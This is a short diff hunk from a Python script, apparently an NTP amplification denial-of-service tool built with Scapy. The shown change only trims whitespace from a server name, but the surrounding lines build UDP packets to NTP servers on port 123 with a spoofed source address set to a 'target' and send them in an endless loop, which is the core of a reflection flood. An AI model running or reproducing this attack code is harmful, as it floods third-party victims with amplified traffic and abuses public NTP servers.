@@ -20,7 +20,7 @@ def deny():
 	global target
 	ntpserver = ntplist[currentserver] #Get new server
 	currentserver = currentserver + 1 #Increment for next 
-	packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
+	packet = IP(dst= str.rstrip(ntpserver),src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
 	send(packet,loop=1) #SEND IT
 
 #So I dont have to have the same stuff twice
